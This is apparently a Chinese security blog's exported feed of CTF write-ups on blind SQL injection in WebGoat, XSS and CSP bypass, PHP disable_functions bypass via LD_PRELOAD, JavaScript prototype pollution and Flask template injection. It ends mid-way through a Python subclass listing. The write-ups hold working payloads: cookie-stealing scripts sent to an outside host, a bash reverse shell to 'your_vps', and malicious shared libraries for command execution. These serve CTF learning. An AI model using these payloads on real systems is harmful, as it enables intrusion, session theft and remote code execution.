@Column(name&#x3D;&quot;nick_name&quot;) private String nickName; &#x2F;&#x2F; SET和GET方法&#125; DAO相关 1234567public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123; List&lt;Author&gt; findAll(); @Query(&quot;from Author where id &#x3D; :id&quot;) Author findAuthor(@Param(&quot;id&quot;) Long id);&#125; 这个from的是对象名，感觉类似于预编译，能防止sql注入 SpringBoot查询findBy规则 所以上面的类似于fileByUsername()类似于 1... where username&#x3D;?1 既然不存在sql注入，继续回去看 createUser()后，在之前public WebGoatUser loadUserByUsername(String username)的return webGoatUser后打上断点，并执行下一步，跳转如下 在进行比较。 注册功能 全局搜索路由/registration 追踪validate() 之后就是addUser()，跟踪下发现也是利用封装好的save()插入数据库 说好的不安全呢？？原来是要登录进去才开始实验 SqlInjection全局搜索sqlinjection就能找到源码 查询的数据中department=Marketing才有回显 尝试联合注入 1select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database() Something went wrong，应该是不支持这种语法，追踪下数据库 不知道是啥类型，测试发现盲注也不行，和mysql不是一个语法的。。这关似乎只是熟悉sql语法 challenge-9 sql语句已经给了，简单的拼接。。 查看挑战org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java 明显问题出在checkUserQuery，是个布尔盲注，如果是mysql就不写了，这里写个脚本试试 这里用--可以注释 substr()可以截取字符串 构造下面的发现回显不同 12tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; -- 是put请求，json格式返回 HTTP协议中PUT和POST使用区别 写个脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import requestsimport jsons = requests.session()cookies = &#123; 'JSESSIONID' :'XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw'&#125;url = \"http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(97, 127): payload = \"password\" param = \"tom' and ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125; and '1'='1\".format(payload, str(i), str(j)) print(param) data = &#123; 'username_reg':param, 'email_reg':'bb%40qq.com', 'password_reg':'cc', 'confirm_password_reg':'cc' &#125; r = requests.put(url=url, headers=headers, data=data, cookies=cookies) # r = requests.post(url=url, headers=headers, cookies=cookies, data=data) c = json.dumps(r.json()) # print(c) if \"already\" in c: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) 最后，有空分析一下spring中的反序列化漏洞和FastJson反序列化漏洞，看了原理还是比较容易理解的。 参考链接 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932 https://www.freebuf.com/vuls/214039.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-03-25T08:07:25.724Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"从几道题学习XSS以及一些相关绕过姿势","text":"从几道题学习XSS以及一些相关绕过姿势 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 hgame-Cosmos的聊天室1 hgame-Comcos聊天室2 RealWorld CTF2019-Mission Invisible RealWorld CTF2019-Hcorme CODEGATE 2020 CSP绕过 0ctf2018-h4xors.club2 参考链接 hgame-Cosmos的聊天室1环境关了，只能yy一下了==！ 过滤了所有闭合标签script、iframe等：re.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),并转化为大写 用浏览器事件执行js，不闭合右标签时会自动补全 payload1 123&lt;svg&#x2F;onload&#x3D;&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 编码内容window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 引入外部页面 这个做法仅限chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" 但是需要解决跨域问题，使用flask或者SimpleHTTPServer开个服务即可 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) 本地测试 hgame-Comcos聊天室2将script替换为空，双写绕过，但是出现报错 Refused to execute inline script because it violates the following ContentSecurity Policy directive: “script-src ‘self’”. Either the ‘unsafe-inline’keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or anonce (‘nonce-…’) is required to enable inline execution. 查看CSP策略 1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; 它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种CSP ⼀般是找该站是否有文件上传点，上传⼀个内容为 alert(/xss/) 的图⽚再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。 本题中有⼀个接口 /send，它会返回过滤后的消息内容，我们可以利用 1&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;alert(1)&quot;&gt;&lt;&#x2F;scscriptript&gt; RealWorld CTF2019-Mission Invisible给了源码，核心是 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; 可以构造一个标签并为其设置属性 只能使用a、p，但是需要使其自动触发，解决办法如下 1&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt; chrome测试成功 之后常规打cookie即可 RealWorld CTF2019-Hcorme 题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。 两个限制：XSS Auditor、Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardold师傅的思路—&gt;utf-16编码绕过 因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。 猜测是类似截断的原理，从而bypass XSS Auditor 绕过CSP，是利用JSONP直接把js代码挂载到本地的script 会进行两次资源请求，第二次的资源类型是script 1print(quote((&#39;&lt;script&#x2F;src&#x3D;?callback&#x3D;alert(1)&gt;&lt;&#x2F;script&gt;&#39;).encode(&#39;utf-16&#39;))) CODEGATE 2020 CSP绕过前面是一个简单的正则绕过，发现存在CSP script-src &#39;none&#39; view.php提交到api.php，格式为name/p1/p2，可以设置header 解决办法：http状态码置为102时，CSP不会执行 颖奇师傅的payload 12345678910#author: 颖奇L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2发现看不懂==！以后再来补 最后给个分享个链接，遇到问题可以查一查：CSP策略及绕过方法 参考链接 https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"从一道题学习bypass disable_func","slug":"从一道题学习bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-03-25T08:07:03.573Z","comments":true,"path":"2020/02/26/从一道题学习bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/","excerpt":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理","text":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 TCTF wallbreaker easy 一、dl()-拓展库绕过 二、imap_mail() 三、putenv() 四、ini_set 五、apache_setenv 参考链接 TCTF wallbreaker easy 很明显，给了我们一个后门，提示需要用Imagick来绕过disable_function，设置了open_basedir，先看看phpinfo() 对比禁用列表 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================分割线 加个error_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================分割线 函数对应的利用点 1234567常规绕过: exec、shell_exec、system、passthru、popen、proc_openld_preload绕过: mail、imap_mail、error_log、mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi 还存在下面5个 12345dlimap_mailputenvini_setapache_setenv 那么就对这个5个一一分析 一、dl()-拓展库绕过 实现方法参考：https://cloud.tencent.com/developer/article/1141142 版本 说明 7.0.0 PHP-FPM 模式下已禁用 dl()。 5.3.9 尽管不推荐，但 PHP-FPM 模式下启用了 dl()。 5.3.0 由于稳定性，dl() 在某些 SAPI 中被禁用。仅仅允许 dl() 的 SAPI 为 CLI 和 Embed。 使用 扩展加载指令 作为替代。 SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。 SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi 1Server API FPM&#x2F;FastCGI 这里未开启dl，遂作罢 二、imap_mail() https://www.exploit-db.com/exploits/35146 适用于PHP &lt; 5.6.2的，遂作罢 三、putenv()putenv()可以设置环境变量 1putenv ( string $setting ) : bool 添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 主要是和LD_PRELOAD打一套组合拳 LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用 1.制作一个恶意shared libraries2.使用putenv设置LD_PRELOAD为恶意文件路径3.使用某个php函数，触发specific shared library4.成功进行RCE 寻找一个能触发这个二进制文件的php函数 最常见的是mail() 123&lt;?php mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; strace一下 1strace -f -e execve php a.php 得到 查看程序可能调用的系统API 1readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail 有很多函数可以使用，这里可以选择geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; 这里要生成 shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so 修改a.php 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; 运行下，发现/tmp下生成了恶意文件，查看 进阶 即使没有安装sendmail也可以RCE，删除sendmail并修改hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; 所以当我们最开始将evil shared library load上后，就会触发__attribute__ ((__constructor__)) ，即使后面出现No such file or dicectory 本题中mail()被disable_func限制，提示php-imagick扩展 源码：https://github.com/ImageMagick/ImageMagick 因为知道要调用ffmpeg，github搜索即可 Makefile.nt 搜索mpeg 这里可以WMV为例 a.php 123&lt;?php $img &#x3D; new Imagick(&#39;sky.wmv&#39;);?&gt; 之后就是和上面类似的查看是否调用 注意的是wmv文件必须存在，否则无法调用ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;d4dabdbc73b87e364e29e60c60a92900&#x2F;flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so 本题中，先上传一个sky.so和1.wmv到/tmp/sandbox下 执行 12putenv(&quot;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;sky.so&quot;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;1.wmv&#39;); 其他解法： 一、覆盖delegate.xml 因为我们要执行/readflag，那么应该是通过系统命令，那么既然delagate.xml里面能够自定义要执行的命令，我们可以直接写delegate来让imagick当处理某个文件后缀时加载我们的delegate.xml，然后执行我们的command即可。 123&lt;delegatemap&gt; &lt;delegate decode&#x3D;&quot;ps:alpha&quot; command&#x3D;&quot;sh -c &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&quot;&quot;&#x2F;&gt;&lt;&#x2F;delegatemap&gt; 再执行 12putenv(&#39;MAGICK_CONFIGURE_PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); 二、覆盖子进程 比上一种更加深入一层 在delegate.xml定义中在decode ept文件时会调用gs，只要指定path为我们的gs的文件夹路径即可达成劫持的效果。 gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd &#x3D; getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; 编译后命名为gs即可，再上传个1.ept 1234putenv(&#39;PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);putenv(&#39;CMD&#x3D;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&#39;);chmod(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;gs&#39;,&#39;0777&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); 三：利用 error_log 函数启动 sendmail 这里我们要用到的就是当 error_log 的第二个参数 message_type 的值为 1 的时候，会调用mail 函数的同一个内置函数(会执行sendmail 命令)的特性。 只需要将第一个mail()例子的hack.c修改成如下即可 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); error_log(&#39;&#39;,1);?&gt; 四、ini_set可以用来绕过open_basedir 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); 五、apache_setenv apache_setenv — 设置 Apache 子进程环境变量 当设置了某 Apache 环境变量, 相应的 $_SERVER 变量不会改变。 搜了下好像没有直接相关的漏洞==！ 最后放上两个常用的bypass链接 some exploits in php7 bypass disable_functions via LD_PRELOAD 参考链接 https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"JavaScript原型链污染","slug":"JavaScript原型链污染","date":"2020-02-25T02:51:11.000Z","updated":"2020-03-25T08:07:12.803Z","comments":true,"path":"2020/02/25/JavaScript原型链污染/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。","text":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 原理 公益赛Ez epress Codebreaking-thejs 总结 参考链接 原理原型 123function A(name)&#123; this.name &#x3D; &#39;a&#39;;&#125; 在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止 在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是__proto__和类的prototype对应。 且二者是等价的 类 数组 上面就是两条完整的原型链，都会指向object，再指向null 再举个原型链搜索的例子 1234567function y()&#123; this.a &#x3D; &#39;a&#39;; this.b &#x3D; &#39;b&#39;;&#125;j &#x3D; new y;y.prototype.c &#x3D; &#39;c&#39;;console.log(j.c) 这个例子中先new了一个对象j，之后再y中添加c，但是仍然打印出了c 当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined 再举个原型链污染的例子 123456a &#x3D; &#123;&#39;b&#39;:1&#125;console.log(a.b)a.__proto__.b &#x3D; 2console.log(a.b)c &#x3D; &#123;&#125;console.log(c.b) 修改a的原型即Object的属性b=2，第一次打印a.b根据搜索顺序为b=1，之后new了一个字典对象即Object，因此属性b=2 再举个原型链污染触发的例子 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125;&#125;let o1 &#x3D; &#123;&#125;;let o2 &#x3D; &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 &#x3D; &#123;&#125;;console.log(o3.b); 当key为__proto__即可原型链污染 理论上执行：o1.a = 1 o1.__proto__.b = 2 输出应该是1，2 和 2 执行一下 原因是这里o2 = {a:1,&quot;__proto__&quot;:{b:2}};是给o2的原型赋值属性b=2，相当于 o2 = {a:1,b:2} 解决这个问题需要使__proto__作为键名 o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejs的RCE 调用child_process模块来执行系统命令 12global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;) 利用方式一般是object的某个属性为上面的模块并被调用 上面都是原理，下面分析几道题 公益赛Ez epressregister需要满足小写不等于admin，之后toUpperCase()存入session，再与ADMIN比较 javascript大小写特性绕过： https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 成功登录后，继续分析代码，发现 1234567891011121314151617181920const merge &#x3D; (a, b) &#x3D;&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] &#x3D; b[attr]; &#125; &#125; return a&#125;const clone &#x3D; (a) &#x3D;&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data &#x3D; clone(req.body);router.get(&#39;&#x2F;info&#39;, function (req, res) &#123; res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);&#125;) /action污染原型链 /info触发污染的原型链 设置object的outputFunctionName的属性：{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag\\&quot;&#39;);var __tmp2&quot;&#125;&#125; 失败了，就想调试下js，本地搭建 12#安装模块npm install 发现没有提供端口启动，原文件是利用bin/www里面启动的，为了方便直接添加 1234567&#x2F;&#x2F;监听端口为3000var server &#x3D; app.listen(3000, function () &#123; var host &#x3D; server.address().address; var port &#x3D; server.address().port; console.log(&#39;Example app listening at http:&#x2F;&#x2F;%s:%s&#39;, host, port);&#125;); node --inspect --debug-brk app.js启动即可利用chrome自带的调试 nodejs调试 未merge()前 merge()后 看下源码才注意到req.session.user.data = clone(req.body); 是整个body。。。修改请求体即可 之前的payload失败是因为没有用json格式发送==！ 访问/info触发原型链，访问/flag下载即可 Codebreaking-thejsserver.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs &#x3D; require(&#39;fs&#39;)const express &#x3D; require(&#39;express&#39;)const bodyParser &#x3D; require(&#39;body-parser&#39;)const lodash &#x3D; require(&#39;lodash&#39;)const session &#x3D; require(&#39;express-session&#39;)const randomize &#x3D; require(&#39;randomatic&#39;)const app &#x3D; express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))app.use(session(&#123; name: &#39;thejs.session&#39;, secret: randomize(&#39;aA0&#39;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine fs.readFile(filePath, (err, content) &#x3D;&gt; &#123; if (err) return callback(new Error(err)) let compiled &#x3D; lodash.template(content) let rendered &#x3D; compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123; let data &#x3D; req.session.data || &#123;language: [], category: []&#125; if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123; data &#x3D; lodash.merge(data, req.body) req.session.data &#x3D; data &#125; res.render(&#39;index&#39;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;)) 使用 lodash 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。 lodash这个模块提供了两个工具lodash.template和lodash.merge，分别可用来进行原型链污染和原型链触发 merge就可以想到之前分析的原型链污染的触发点，因为这是一个express框架，支持Json直接传输数据，并且接收的参数为req.body lodash.template的源码 https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result &#x3D; attempt(function() &#123; return Function(importsKeys, sourceURL + &#39;return &#39; + source) .apply(undefined, importsValues);&#125;); 追踪sourceURL 1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; 其中 option 为我们在模版引擎中，渲染的值。这里读取其中的 sourceURL 属性的值，我们就可以通过这里触发原型污染 payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e &#x3D;&gt;&#123;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#125;&quot;&#125;&#125;&#125; 总结简单学习了JavaScript原型链污染的原理以及两道简单的题，下一步学习可以是一些源码更加复杂，或者与其他漏洞结合利用。 参考链接 https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"flask模版注入","slug":"flask模版注入","date":"2020-02-24T01:11:15.000Z","updated":"2020-04-04T15:29:41.217Z","comments":true,"path":"2020/02/24/flask模版注入/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/","excerpt":"比赛时遇到flask ssti，遂复习一下","text":"比赛时遇到flask ssti，遂复习一下 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 简述 Python2 Python3 Some Tricks（测试环境为Py2） 总结 参考链接 简述 漏洞原理参考 漏洞原理用一句话概括：不正确的使用flask中的render_template_string()导致的SSTI，并且模板内容直接受用户控制 这篇文章主要是借flask SSTI复习下python沙盒逃逸，整理下payload，理论上不同机器、不同python版本的payload是不尽相同的。 测试代码 1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) 两种启动方式： flask run --host=0.0.0.0，需要启动的时候设置host，app.run()中更改无效 python app.py，在app.run()中设置host，切换python版本比较方便 确认正常访问 全局变量 ,比较常见的读取是SECRET_KEY 文件读取/命令执行 无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类&lt;type &#39;object&#39;&gt;，再寻找子类，最后找到我们需要用到的相应模块 几个要用到的魔术方法 12345678__class__ 返回类型所属的对象__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__ 返回该对象所继承的基类&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__ 类的初始化方法__globals__ 对包含函数全局变量的字典的引用 Python2先测试Python 2.7.17 需要先选取一个类，几种常见的类&#39;&#39;、request、[]、() 1、获取类对象 123456789&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &#39;module&#39;&gt;&gt;&gt;&gt; [].__class__&lt;type &#39;list&#39;&gt;&gt;&gt;&gt; ().__class__&lt;type &#39;tuple&#39;&gt; 2、寻找基类object 12345678910111213&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &#39;object&#39;&gt; object在最底层故在列表中的最后，通过__mro__[-1]可以获取到 3、寻找可用的引用 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type 